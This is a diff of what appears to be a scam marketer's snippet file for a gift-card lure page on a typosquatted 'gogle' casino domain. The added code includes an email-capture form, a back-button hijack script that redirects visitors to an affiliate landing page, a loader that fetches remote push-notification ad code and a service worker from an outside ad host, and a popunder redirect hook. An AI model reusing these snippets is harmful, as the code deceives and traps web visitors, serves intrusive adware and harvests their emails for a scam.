@@ -1,15 +1,72 @@
 域名:https://gogle.cas-track.casino/Giftcard/index.html
 
--------------------------------google
-<!-- Google tag (gtag.js) -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=G-2TP2HSWDBF"></script>
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
-
-  gtag('config', 'G-2TP2HSWDBF');
-</script>
-
-<!-- Google 标签 (gtag.js) --> <script async src="https://www.googletagmanager.com/gtag/js?id=G-2TP2HSWDBF"></script> <script> window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-2TP2HSWDBF'); </script>
 -------------------------------
+Paste this code as high in the <head> of the page as possible:
+-------------------------------
+<!-- Google Tag Manager -->
+<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+})(window,document,'script','dataLayer','GTM-M7TDH3PQ');</script>
+<!-- End Google Tag Manager -->
+-------------------------------
+2. Paste this code immediately after the opening <body> tag:
+<!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-M7TDH3PQ"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) -->
+
+
+
+***********************************
+Email-
+<form action="https://cas-track.online/sendy/subscribe" method="POST" accept-charset="utf-8">
+                <label for="email">Email</label><br/>
+                <input type="email" name="email" id="email" required /><br/>
+                
+                <!-- Honeypot-->
+                <div style="display:none;">
+                    <label for="hp">HP</label><br/>
+                    <input type="text" name="hp" id="hp"/>
+                </div>
+            
+                <input type="hidden" name="list" value="Fm4UY1D4JXfyn6nSE4UhJg"/>
+                <input type="hidden" name="subform" value="yes"/>
+                <input type="submit" name="submit" id="submit" value="Subscribe Now"/>
+            </form>
+
+***********************************后退代码Before the closing </body> HTML tag
+    <script>
+        (function(window, location) {
+        history.replaceState(null, document.title, location.pathname+"#!/history");
+        history.pushState(null, document.title, location.pathname);
+        
+        window.addEventListener("popstate", function() {
+          if(location.hash === "#!/history") {
+            history.replaceState(null, document.title, location.pathname);
+            setTimeout(function(){
+              location.replace("http://lp.innovate-niche.com/input-BBR/index.html?key=ybzoy66mivk27imho24y&c1=BBR&c2=NG");
+            },0);
+          }
+        }, false);
+        }(window, location));
+        </script>
+**************************<!-- 复制本段Before the closing </head> HTML tag执行propush -->
+        <script>
+		var s = document.createElement('script');
+		s.src='//deehalig.net/act/files/micro.tag.min.js?z=5705526'+'&sw=/sw-check-permissions-9098f.js';
+		s.onload = function(result) {
+			switch (result) {
+				case 'onPermissionDefault':break;
+				case 'onPermissionAllowed':break;
+				case 'onPermissionDenied':break;
+				case 'onAlreadySubscribed':break;
+				case 'onNotificationUnsupported':break;
+			}
+		};
+		document.head.appendChild(s);
+	</script>  
+***************************popunder
+<!--  复制本段Before the closing </body> HTML tag执行当前页面重定向 CTA按钮的ID需要和js文件ID吻合 -->
+    <script src="script.js"> </script>
